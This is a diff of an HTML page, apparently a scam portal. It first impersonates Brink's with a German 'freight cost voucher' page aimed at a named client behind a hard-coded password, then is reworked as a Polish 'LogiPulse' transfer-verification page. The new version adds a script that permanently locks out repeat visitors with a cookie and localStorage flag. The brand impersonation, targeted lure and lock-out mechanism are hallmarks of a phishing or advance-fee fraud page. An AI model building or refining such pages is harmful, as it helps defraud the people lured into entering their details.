@@ -1,13 +1,46 @@
-﻿<!DOCTYPE html>
-<html lang="de">
+<!DOCTYPE html>
+<html lang="pl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="page-title">Brink's Secure Logistics | Frachtkosten-Gutschein</title>
-    <!-- Professionelle Unternehmensschriftart Inter -->
+    <title id="page-title">LogiPulse Secure Logistics | Weryfikacja transferu</title>
+    
+    <!-- Corporate Font Inter -->
+    <link href="https://fonts.googleapis.com" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
     <!-- FontAwesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Мгновенная синхронная защита от промелькивания (Flicker Guard) -->
+    <script>
+        (function() {
+            function getCookie(name) {
+                var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));
+                return matches ? decodeURIComponent(matches[1]) : undefined;
+            }
+            
+            var cookieLocked = getCookie('lp_locked') === 'true';
+            var localLocked = localStorage.getItem('lp_locked') === 'true';
+            
+            if (cookieLocked || localLocked) {
+                window.__IS_LOCKED__ = true;
+                // Синхронизация между Cookie и LocalStorage
+                document.cookie = "lp_locked=true; max-age=315360000; path=/; SameSite=Lax";
+                localStorage.setItem('lp_locked', 'true');
+                
+                // Внедряем критический CSS до рендеринга DOM
+                var style = document.createElement('style');
+                style.id = 'early-lock-style';
+                style.innerHTML = '#cardMainContent { display: none !important; } #blockedContent { display: flex !important; }';
+                document.head.appendChild(style);
+            } else {
+                window.__IS_LOCKED__ = false;
+            }
+        })();
+    </script>
     
     <style>
         :root {
@@ -16,140 +49,79 @@
             --brinks-accent: #004C97;
             --bg-body: #EEF3F8;
             --card-bg: #FFFFFF;
-            --text-main: #0B1D2A;
-            --text-muted: #4B6378;
-            --border-color: #D2E0EE;
+            --text-main: #1E293B;
+            --text-muted: #64748B;
+            --border-color: #CBD5E1;
+            --border-light: #E2E8F0;
             --success-green: #10B981;
             --success-bg: rgba(16, 185, 129, 0.08);
             --error-red: #EF4444;
             --error-bg: rgba(239, 68, 68, 0.08);
-            --warning-yellow: #D97706;
-            --warning-bg: rgba(245, 158, 11, 0.1);
+            --pending-yellow: #B45309;
+            --pending-bg: #FEF3C7;
+            --pending-border: #FCD34D;
         }
 
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Inter', sans-serif;
+            font-family: 'Inter', -apple-system, sans-serif;
+            letter-spacing: normal;
+            word-spacing: normal;
         }
 
         body {
             background-color: var(--bg-body);
             color: var(--text-main);
             min-height: 100vh;
+            min-height: 100dvh;
+            height: auto;
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-        }
-
-        /* Экран авторизации (пароль 11.05.1958) */
-        .auth-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #001A2D;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 2000;
-            padding: 20px;
-            transition: opacity 0.3s ease, visibility 0.3s ease;
-        }
-
-        .auth-overlay.hidden {
-            opacity: 0;
-            visibility: hidden;
-            pointer-events: none;
-        }
-
-        .auth-card {
-            background: var(--card-bg);
-            width: 100%;
-            max-width: 440px;
-            padding: 42px 36px;
-            border-radius: 10px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
-            border-top: 5px solid var(--brinks-accent);
-            text-align: center;
-        }
-
-        .auth-brand {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 22px;
-            text-decoration: none;
-        }
-
-        .auth-bars-svg {
-            height: 35px;
-            width: auto;
-            display: block;
-        }
-
-        .auth-wordmark {
-            font-size: 35px;
-            font-weight: 900;
-            color: var(--brinks-accent);
-            letter-spacing: -1.2px;
-            line-height: 1;
-            display: block;
-            margin-left: -2px;
-        }
-
-        .auth-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: var(--brinks-primary);
-            margin-bottom: 8px;
-        }
-
-        .auth-desc {
             font-size: 13px;
-            color: var(--text-muted);
-            margin-bottom: 24px;
             line-height: 1.5;
+            text-align: left !important;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            text-rendering: optimizeLegibility;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
+            hyphens: auto !important;
         }
 
-        .auth-error {
-            font-size: 12px;
-            color: var(--error-red);
-            background: var(--error-bg);
-            border: 1px solid rgba(239, 68, 68, 0.2);
-            padding: 10px;
-            border-radius: 6px;
-            margin-bottom: 16px;
-            display: none;
-            font-weight: 600;
+        p, span, div, h1, label {
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
+            hyphens: auto !important;
+            text-align: left !important;
         }
 
-        /* Основной контент (скрыт до ввода пароля) */
+        /* Main Wrapper */
         .main-app-wrapper {
-            display: none;
+            display: flex;
             flex-direction: column;
             min-height: 100vh;
+            min-height: 100dvh;
+            height: auto;
             justify-content: space-between;
         }
 
-        .main-app-wrapper.visible {
-            display: flex;
-        }
-
-        /* Obere Sicherheitsleiste */
+        /* Top Security Bar */
         .top-security-bar {
             background-color: #001A2D;
-            color: #8BAAC9;
+            color: #94A3B8;
             font-size: 11px;
-            font-weight: 500;
+            font-weight: 600;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            padding: 8px 40px;
+            padding: 8px 32px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            text-align: left !important;
+            min-height: max-content;
+            height: auto;
         }
 
         .top-security-bar span {
@@ -161,180 +133,144 @@
         /* Header */
         header {
             background-color: var(--card-bg);
-            border-bottom: 2px solid var(--border-color);
-            padding: 18px 40px;
+            border-bottom: 1px solid var(--border-color);
+            padding: 14px 32px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            box-shadow: 0 4px 20px rgba(0, 43, 73, 0.03);
+            box-shadow: 0 2px 10px rgba(0, 43, 73, 0.03);
+            text-align: left !important;
+            min-height: max-content;
+            height: auto;
         }
 
         .logo-block {
             display: flex;
             align-items: center;
+            justify-content: flex-start;
+            min-height: 70px;
+            height: 70px;
+            padding: 0 !important;
+            margin: 0 !important;
+            float: none !important;
         }
 
-        .brinks-brand {
-            display: flex;
-            align-items: center;
-            text-decoration: none;
-        }
-
-        .brinks-bars-svg {
-            height: 35px;
-            width: auto;
-            display: block;
-        }
-
-        .brinks-wordmark {
-            font-size: 35px;
-            font-weight: 900;
-            color: var(--brinks-accent);
-            letter-spacing: -1.2px;
-            line-height: 1;
-            display: block;
-            margin-left: -2px;
+        .logipulse-logo {
+            height: 70px !important;
+            max-height: 70px !important;
+            width: auto !important;
+            display: block !important;
+            object-fit: contain;
+            margin: 0 !important;
+            padding: 0 !important;
+            float: none !important;
         }
 
         .header-right {
             display: flex;
             align-items: center;
-            gap: 20px;
+            gap: 16px;
         }
 
         .tagline {
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 600;
             color: var(--text-muted);
-            letter-spacing: 0.8px;
+            line-height: 1.4;
             text-transform: uppercase;
             border-left: 2px solid var(--border-color);
-            padding-left: 18px;
+            padding-left: 14px;
+            white-space: normal;
+            text-align: left !important;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
+            hyphens: auto !important;
         }
 
-        /* Переключатель языков */
+        /* Language Switcher */
         .lang-switcher {
             display: flex;
             background: #EEF3F8;
             border-radius: 6px;
             padding: 3px;
             border: 1px solid var(--border-color);
+            gap: 2px;
         }
 
         .lang-btn {
             background: transparent;
             border: none;
-            padding: 6px 10px;
-            font-size: 12px;
+            padding: 5px 10px;
+            font-size: 11px;
             font-weight: 700;
             color: var(--text-muted);
             cursor: pointer;
             border-radius: 4px;
             transition: all 0.2s ease;
+            outline: none;
+            min-height: 28px;
+            height: auto;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center !important;
+            line-height: 1.2;
+        }
+
+        .lang-btn:hover {
+            color: var(--brinks-primary);
+            background: rgba(0, 76, 151, 0.08);
         }
 
         .lang-btn.active {
             background: var(--brinks-accent);
             color: #FFFFFF;
-            box-shadow: 0 2px 6px rgba(0, 76, 151, 0.2);
+            box-shadow: 0 2px 5px rgba(0, 76, 151, 0.2);
         }
 
-        /* Hauptbereich */
+        [data-i18n], [data-i18n-placeholder], .tagline {
+            transition: opacity 0.15s ease;
+        }
+
+        .lang-fade-out {
+            opacity: 0 !important;
+        }
+
+        /* Main Content */
         main {
             flex: 1;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 40px 20px;
+            padding: 20px 16px;
+            min-height: max-content;
+            height: auto;
         }
 
         .verification-container {
             background: var(--card-bg);
             width: 100%;
             max-width: 540px;
-            padding: 48px 42px;
-            border-radius: 10px;
-            box-shadow: 0 12px 40px rgba(0, 43, 73, 0.07);
+            padding: 20px 20px 18px 20px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 43, 73, 0.06);
             border-top: 4px solid var(--brinks-accent);
             position: relative;
+            text-align: left !important;
+            min-height: max-content;
+            height: auto;
         }
 
-        /* Информационный блок пользователя (Valentina Martyn + статус) в строгом стиле */
-        .user-client-box {
-            background: #F8FAFC;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 18px 20px;
-            margin-bottom: 24px;
+        /* Форма по умолчанию скрыта CSS-правилом для защиты от промелькивания */
+        #cardMainContent {
+            display: none;
         }
 
-        .client-greeting {
-            font-size: 15px;
-            font-weight: 700;
-            color: var(--brinks-primary);
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .client-details {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            font-size: 13px;
-            color: var(--text-main);
-        }
-
-        .client-row {
+        .header-actions-bar {
             display: flex;
             justify-content: space-between;
             align-items: center;
-        }
-
-        .client-row span:first-child {
-            color: var(--text-muted);
-            font-weight: 500;
-        }
-
-        .client-row span:last-child {
-            font-weight: 600;
-        }
-
-        .status-badge-pending {
-            background-color: var(--warning-bg);
-            color: var(--warning-yellow);
-            border: 1px solid rgba(217, 119, 6, 0.3);
-            padding: 3px 10px;
-            border-radius: 12px;
-            font-size: 11px;
-            font-weight: 700;
-            text-transform: uppercase;
-        }
-
-        /* Профессиональный блок примечания (без дешевого желтого сплошного текста) */
-        .client-note {
-            margin-top: 12px;
-            padding-top: 12px;
-            border-top: 1px solid var(--border-color);
-            font-size: 12px;
-            color: var(--text-muted);
-            font-weight: 400;
-            line-height: 1.5;
-            display: flex;
-            align-items: flex-start;
-            gap: 8px;
-            background: #FFFFFF;
-            padding: 10px 12px;
-            border-radius: 6px;
-            border-left: 3px solid var(--brinks-accent);
-        }
-
-        .client-note i {
-            color: var(--brinks-accent);
-            font-size: 13px;
-            margin-top: 2px;
-            flex-shrink: 0;
+            margin-bottom: 12px;
         }
 
         .system-badge {
@@ -344,41 +280,243 @@
             background-color: rgba(0, 76, 151, 0.08);
             color: var(--brinks-accent);
             font-size: 11px;
-            font-weight: 600;
+            font-weight: 700;
             padding: 5px 12px;
-            border-radius: 20px;
-            margin-bottom: 20px;
+            border-radius: 16px;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
+            line-height: 1.4;
+            text-align: left !important;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
+            hyphens: auto !important;
         }
 
+        /* Container & Tabs */
+        .info-block {
+            background: #F8FAFC;
+            border: 1px solid var(--border-light);
+            border-radius: 8px;
+            margin-bottom: 14px;
+            width: 100%;
+            height: auto !important;
+            min-height: max-content !important;
+            padding: 14px !important;
+            display: flex !important;
+            flex-direction: column !important;
+            gap: 10px !important;
+            box-sizing: border-box !important;
+        }
+
+        /* Tabs Header */
+        .info-tabs-header {
+            display: flex;
+            gap: 6px;
+            border-bottom: 1px solid var(--border-light);
+            padding-bottom: 8px;
+            margin-bottom: 0;
+            flex-wrap: wrap;
+        }
+
+        .info-tab-btn {
+            background: transparent;
+            border: 1px solid transparent;
+            padding: 6px 14px;
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--text-muted);
+            border-radius: 6px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.2s ease;
+            text-align: center !important;
+            line-height: 1.3;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
+            hyphens: auto !important;
+        }
+
+        .info-tab-btn:hover {
+            color: var(--brinks-primary);
+            background-color: rgba(0, 76, 151, 0.05);
+        }
+
+        .info-tab-btn.active {
+            background-color: var(--brinks-primary);
+            color: #FFFFFF;
+            border-color: var(--brinks-primary);
+        }
+
+        .tab-content {
+            animation: fadeIn 0.2s ease;
+            min-height: max-content;
+            height: auto;
+            width: 100%;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(2px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Data Tab Rows */
+        #tabContentData .info-item,
+        #tabContentData .info-item.full-width {
+            display: flex !important;
+            justify-content: space-between !important;
+            align-items: center !important;
+            width: 100% !important;
+            height: 32px !important;
+            position: static !important;
+            border-bottom: 1px solid #f1f5f9 !important;
+            padding-bottom: 4px !important;
+            margin: 0 !important;
+            box-sizing: border-box !important;
+        }
+
+        #tabContentData .info-item.full-width {
+            border-bottom: none !important;
+            padding-bottom: 0 !important;
+        }
+
+        #tabContentData .status-container-fixed {
+            display: flex !important;
+            justify-content: space-between !important;
+            align-items: center !important;
+            width: 100% !important;
+            height: 100% !important;
+        }
+
+        .info-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            width: 100%;
+        }
+
+        #tabContentInfo .info-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            padding: 4px 0;
+            border-bottom: 1px solid #f1f5f9;
+        }
+
+        /* Typography */
+        .info-label {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
+            font-size: 12px !important;
+            font-weight: 500 !important;
+            color: #64748b !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.03em !important;
+            margin: 0 !important;
+            line-height: 1 !important;
+        }
+
+        .info-value {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
+            font-size: 13px !important;
+            font-weight: 600 !important;
+            color: #0f172a !important;
+            line-height: 1 !important;
+        }
+
+        /* Premium Amount Badge */
+        .premium-amount {
+            color: #15803d !important;
+            background-color: #f0fdf4 !important;
+            padding: 4px 8px !important;
+            border-radius: 4px !important;
+            font-weight: 600 !important;
+            font-size: 13px !important;
+            border: 1px solid #dcfce7 !important;
+            letter-spacing: -0.01em !important;
+            font-variant-numeric: tabular-nums !important;
+            display: inline-flex !important;
+            align-items: center !important;
+            line-height: 1 !important;
+        }
+
+        /* Status Badge */
+        .status-badge-pending {
+            display: inline-flex !important;
+            align-items: center !important;
+            gap: 6px !important;
+            padding: 4px 10px !important;
+            background-color: #fdf2e9 !important;
+            color: #78350f !important;
+            font-size: 11px !important;
+            font-weight: 600 !important;
+            border-radius: 12px !important;
+            text-transform: uppercase !important;
+            border: 1px solid #fef3c7 !important;
+            height: auto !important;
+            line-height: 1 !important;
+        }
+
+        .info-text-description {
+            font-size: 12px;
+            line-height: 1.45;
+            color: var(--text-muted);
+            background: rgba(0, 76, 151, 0.03);
+            border-left: 3px solid var(--brinks-accent);
+            padding: 10px 12px;
+            border-radius: 4px;
+            text-align: left !important;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
+            hyphens: auto !important;
+            margin-top: 8px;
+        }
+
+        /* Title & Description */
         .card-title {
-            font-size: 20px;
+            font-size: 17px;
             font-weight: 700;
             color: var(--brinks-primary);
-            margin-bottom: 10px;
-            letter-spacing: -0.3px;
+            margin-bottom: 6px;
+            line-height: 1.35;
+            text-align: left !important;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
+            hyphens: auto !important;
+            margin-top: 12px !important;
+            display: block !important;
+            width: 100% !important;
+            clear: both !important;
         }
 
         .card-description {
-            font-size: 14px;
+            font-size: 12px;
             color: var(--text-muted);
-            margin-bottom: 30px;
-            line-height: 1.6;
+            margin-bottom: 14px;
+            line-height: 1.45;
+            text-align: left !important;
+            hyphens: auto !important;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
         }
 
         .form-group {
-            margin-bottom: 24px;
+            margin-bottom: 12px;
+            text-align: left !important;
         }
 
         .form-label {
             display: block;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 700;
             color: var(--brinks-primary);
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             text-transform: uppercase;
-            letter-spacing: 0.6px;
+            line-height: 1.4;
+            text-align: left !important;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
+            hyphens: auto !important;
         }
 
         .input-container {
@@ -387,24 +525,28 @@
 
         .input-container i {
             position: absolute;
-            left: 16px;
+            left: 14px;
             top: 50%;
             transform: translateY(-50%);
             color: var(--text-muted);
-            font-size: 15px;
+            font-size: 14px;
         }
 
         .secure-input {
             width: 100%;
-            padding: 15px 16px 15px 48px;
-            font-size: 15px;
+            padding: 10px 14px 10px 40px;
+            font-size: 13px;
             font-weight: 500;
             border: 1px solid var(--border-color);
             border-radius: 6px;
             outline: none;
-            transition: all 0.25s ease;
+            transition: all 0.2s ease;
             color: var(--text-main);
             background-color: #F8FAFC;
+            text-align: left !important;
+            font-family: 'Inter', sans-serif;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
         }
 
         .secure-input:focus {
@@ -415,608 +557,608 @@
 
         .submit-btn {
             width: 100%;
-            padding: 15px;
+            padding: 11px;
             background-color: var(--brinks-primary);
             color: #FFFFFF;
             border: none;
             border-radius: 6px;
-            font-size: 15px;
-            font-weight: 600;
+            font-size: 13px;
+            font-weight: 700;
             cursor: pointer;
-            transition: background-color 0.25s ease;
-            box-shadow: 0 4px 12px rgba(0, 43, 73, 0.15);
-            letter-spacing: 0.3px;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            box-shadow: 0 2px 8px rgba(0, 43, 73, 0.12);
+            line-height: 1.4;
+            text-align: center !important;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
+            hyphens: auto !important;
+            min-height: max-content;
+            height: auto;
         }
 
         .submit-btn:hover {
             background-color: var(--brinks-secondary);
         }
 
+        .submit-btn:active {
+            transform: scale(0.99);
+        }
+
         .support-hint {
-            margin-top: 22px;
-            text-align: center;
+            margin-top: 12px;
+            text-align: center !important;
             font-size: 12px;
             color: var(--text-muted);
+            line-height: 1.45;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
+            hyphens: auto !important;
         }
 
         .support-hint a {
             color: var(--brinks-accent);
             text-decoration: none;
             font-weight: 600;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
+            hyphens: auto !important;
         }
 
         .support-hint a:hover {
             text-decoration: underline;
         }
 
-        /* Modal Base */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 20, 35, 0.7);
-            backdrop-filter: blur(6px);
-            display: flex;
+        /* Locked / Blocked State Box */
+        .blocked-card-content {
+            display: none;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 20px;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.3s ease;
-            z-index: 1000;
+            padding: 32px 20px;
+            text-align: center !important;
         }
 
-        .modal-overlay.active {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .modal-card {
-            background: var(--card-bg);
-            width: 100%;
-            max-width: 480px;
-            padding: 40px 35px;
-            border-radius: 10px;
-            text-align: center;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
-            transform: translateY(15px);
-            transition: transform 0.3s ease;
-        }
-
-        .modal-overlay.active .modal-card {
-            transform: translateY(0);
-        }
-
-        /* Success Modal Styles */
-        #alertModal .modal-card {
-            border-top: 5px solid var(--success-green);
-        }
-
-        .success-symbol {
-            width: 64px;
-            height: 64px;
-            background-color: var(--success-bg);
-            border: 2px solid rgba(16, 185, 129, 0.2);
+        /* EXCLAMATION MARK BLOCK - Мягкая подсветка и строгие размеры */
+        .blocked-icon-wrapper {
+            width: 80px;
+            height: 80px;
+            background-color: rgba(254, 242, 242, 0.8);
+            border: 1px solid rgba(220, 38, 38, 0.2);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 20px auto;
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px rgba(220, 38, 38, 0.06);
         }
 
-        .success-symbol i {
-            font-size: 26px;
-            color: var(--success-green);
+        .blocked-icon-wrapper i {
+            font-size: 32px !important;
+            color: #DC2626;
+            font-weight: 500 !important;
         }
 
-        .modal-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: var(--brinks-primary);
-            margin-bottom: 12px;
-            letter-spacing: -0.2px;
-        }
-
-        .modal-message {
-            font-size: 14px;
-            color: var(--text-main);
-            line-height: 1.65;
-            margin-bottom: 24px;
-            text-align: center;
-            background-color: var(--success-bg);
-            padding: 18px;
-            border-radius: 6px;
-            border: 1px solid rgba(16, 185, 129, 0.2);
-            font-weight: 600;
-        }
-
-        .error-meta {
-            font-size: 11px;
-            color: #78909C;
-            text-align: left;
-            margin-bottom: 24px;
-            font-family: monospace;
-            background: #EDF2F7;
-            padding: 8px 12px;
-            border-radius: 4px;
-        }
-
-        .modal-action-btn {
-            background-color: var(--success-green);
-            color: #FFFFFF;
-            border: none;
-            padding: 14px 30px;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.2s;
+        /* БЛОК СООБЩЕНИЯ - Строгие прямоугольные формы и утонченная типографика */
+        .blocked-message {
+            font-size: 13px !important;
+            font-weight: 500 !important;
+            color: #7f1d1d !important;
+            line-height: 1.5 !important;
+            letter-spacing: -0.015em !important;
+            text-align: left !important;
+            background-color: rgba(254, 242, 242, 0.6) !important;
+            border: 1px solid rgba(220, 38, 38, 0.16) !important;
+            border-radius: 4px !important;
+            padding: 16px 18px;
             width: 100%;
-            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.25);
-        }
-
-        .modal-action-btn:hover {
-            background-color: #059669;
-        }
-
-        /* Error Modal Styles */
-        #errorModal .modal-card {
-            border-top: 5px solid var(--error-red);
-        }
-
-        .error-symbol {
-            width: 64px;
-            height: 64px;
-            background-color: var(--error-bg);
-            border: 2px solid rgba(239, 68, 68, 0.2);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px auto;
-        }
-
-        .error-symbol i {
-            font-size: 26px;
-            color: var(--error-red);
-        }
-
-        .error-message-box {
-            font-size: 14px;
-            color: var(--text-main);
-            line-height: 1.65;
-            margin-bottom: 24px;
-            text-align: center;
-            background-color: var(--error-bg);
-            padding: 18px;
-            border-radius: 6px;
-            border: 1px solid rgba(239, 68, 68, 0.2);
-            font-weight: 600;
-        }
-
-        .error-action-btn {
-            background-color: var(--error-red);
-            color: #FFFFFF;
-            border: none;
-            padding: 14px 30px;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.2s;
-            width: 100%;
-            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.25);
-        }
-
-        .error-action-btn:hover {
-            background-color: #DC2626;
+            word-break: normal !important;
+            overflow-wrap: break-word !important;
+            hyphens: auto !important;
         }
 
         /* Footer */
         footer {
             background-color: var(--brinks-primary);
-            color: rgba(255, 255, 255, 0.65);
-            padding: 22px 40px;
+            color: rgba(255, 255, 255, 0.75);
+            padding: 12px 32px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            font-size: 12px;
+            font-size: 11px;
+            font-weight: 400;
             border-top: 1px solid rgba(255, 255, 255, 0.08);
+            text-align: left !important;
+            line-height: 1.4;
+            min-height: max-content;
+            height: auto;
         }
 
-        @media (max-width: 850px) {
+        /* Responsive Design & Strict Mobile Logo Alignment */
+        @media screen and (max-width: 768px) {
+            header .logo-block {
+                display: flex !important;
+                justify-content: center !important;
+                align-items: center !important;
+                width: 100% !important;
+                padding: 0 !important;
+                margin: 0 auto !important;
+                position: static !important;
+                float: none !important;
+                text-align: center !important;
+                min-height: 54px !important;
+                height: 54px !important;
+            }
+
+            header img, .logo img, img[src*="logo.png"], .logipulse-logo {
+                height: 54px !important;
+                max-height: 54px !important;
+                width: auto !important;
+                display: block !important;
+                margin: 0 auto !important;
+                padding: 0 !important;
+                position: static !important;
+                float: none !important;
+                object-fit: contain !important;
+            }
+        }
+
+        @media (max-width: 640px) {
             .top-security-bar {
-                display: none;
+                padding: 8px 16px;
+                font-size: 10px;
+                flex-direction: column;
+                gap: 4px;
+                text-align: center !important;
             }
             header {
                 flex-direction: column;
-                gap: 14px;
-                text-align: center;
-                padding: 15px 20px;
+                gap: 10px;
+                text-align: center !important;
+                padding: 12px 16px;
             }
             .header-right {
                 flex-direction: column;
-                gap: 10px;
+                gap: 8px;
+                width: 100%;
             }
             .tagline {
                 border-left: none;
                 padding-left: 0;
                 border-top: 1px solid var(--border-color);
-                padding-top: 10px;
+                padding-top: 8px;
+                font-size: 11px;
+                width: 100%;
+                text-align: center !important;
+            }
+            .lang-switcher {
+                width: 100%;
+                justify-content: center;
+            }
+            .lang-btn {
+                flex: 1;
+                padding: 5px 8px;
+            }
+            main {
+                padding: 14px 10px;
+            }
+            .verification-container {
+                padding: 16px 14px;
+            }
+            .card-title {
+                font-size: 15px;
             }
             footer {
                 flex-direction: column;
-                gap: 10px;
-                text-align: center;
-                padding: 15px 20px;
-            }
-            .verification-container {
-                padding: 30px 20px;
+                gap: 6px;
+                text-align: center !important;
+                padding: 10px 16px;
             }
         }
     </style>
 </head>
 <body>
 
-    <!-- Экран авторизации (вход по паролю 11.05.1958) -->
-    <div class="auth-overlay" id="authOverlay">
-        <div class="auth-card">
-            <a href="#" class="auth-brand" onclick="return false;">
-                <svg class="auth-bars-svg" viewBox="0 0 42 35" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <rect x="0" y="0" width="2" height="35" fill="#004C97"/>
-                    <rect x="5" y="0" width="2.5" height="35" fill="#004C97"/>
-                    <rect x="11" y="0" width="3" height="35" fill="#004C97"/>
-                    <rect x="17" y="0" width="3.5" height="35" fill="#004C97"/>
-                    <rect x="23" y="0" width="4" height="35" fill="#004C97"/>
-                    <rect x="29" y="0" width="4.5" height="35" fill="#004C97"/>
-                    <rect x="35" y="0" width="6.5" height="35" fill="#004C97"/>
-                </svg>
-                <span class="auth-wordmark">Brink's</span>
-            </a>
-            <div class="auth-title" data-i18n="auth_title">Sicherheitsanmeldung</div>
-            <div class="auth-desc" data-i18n="auth_desc">Bitte geben Sie Ihr persönliches Zugangskennwort ein, um fortzufahren.</div>
-            
-            <div class="auth-error" id="authErrorMsg" data-i18n="auth_err">Falsches Kennwort. Bitte versuchen Sie es erneut.</div>
-
-            <form onsubmit="handleAuth(event)">
-                <div class="form-group" style="text-align: left; margin-bottom: 20px;">
-                    <label class="form-label" for="authPassword" data-i18n="auth_label">Zugangskennwort</label>
-                    <div class="input-container">
-                        <i class="fa-solid fa-key"></i>
-                        <input type="password" id="authPassword" class="secure-input" data-i18n-placeholder="auth_placeholder" placeholder="Passwort eingeben..." required autocomplete="off">
-                    </div>
-                </div>
-                <button type="submit" class="submit-btn" data-i18n="auth_btn">Anmelden</button>
-            </form>
-        </div>
-    </div>
-
-    <!-- Основное приложение (появляется после успешного ввода пароля) -->
     <div class="main-app-wrapper" id="mainAppWrapper">
 
         <!-- Obere Sicherheitsleiste -->
         <div class="top-security-bar">
-            <span><i class="fa-solid fa-lock" style="color: #004C97;"></i> <span data-i18n="sec_bar">Gesichertes Logistik-Portal</span></span>
-            <span data-i18n="sys_num">Protokoll: BRK-LOG-VOUCHER</span>
+            <span><i class="fa-solid fa-lock" style="color: #004C97;"></i> <span data-i18n="sec_bar">Bezpieczny portal logistyczny</span></span>
+            <span data-i18n="sys_num">Protokół: LGP-LOG-VOUCHER</span>
         </div>
 
         <!-- Header -->
         <header>
             <div class="logo-block">
-                <a href="#" class="brinks-brand" onclick="return false;">
-                    <svg class="brinks-bars-svg" viewBox="0 0 42 35" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <rect x="0" y="0" width="2" height="35" fill="#004C97"/>
-                        <rect x="5" y="0" width="2.5" height="35" fill="#004C97"/>
-                        <rect x="11" y="0" width="3" height="35" fill="#004C97"/>
-                        <rect x="17" y="0" width="3.5" height="35" fill="#004C97"/>
-                        <rect x="23" y="0" width="4" height="35" fill="#004C97"/>
-                        <rect x="29" y="0" width="4.5" height="35" fill="#004C97"/>
-                        <rect x="35" y="0" width="6.5" height="35" fill="#004C97"/>
-                    </svg>
-                    <span class="brinks-wordmark">Brink's</span>
+                <a href="javascript:void(0);" style="display: block; margin: 0; padding: 0;">
+                    <img src="logo.png" alt="LogiPulse" class="logipulse-logo">
                 </a>
             </div>
             
             <div class="header-right">
-                <!-- Переключатель языков -->
+                <!-- Sprachauswahl -->
                 <div class="lang-switcher">
-                    <button class="lang-btn" onclick="setLanguage('ru')">RU</button>
-                    <button class="lang-btn" onclick="setLanguage('en')">EN</button>
-                    <button class="lang-btn active" onclick="setLanguage('de')">DE</button>
-                    <button class="lang-btn" onclick="setLanguage('pl')">PL</button>
+                    <button class="lang-btn" data-lang="ru" onclick="setLanguage('ru', event)">RU</button>
+                    <button class="lang-btn" data-lang="en" onclick="setLanguage('en', event)">EN</button>
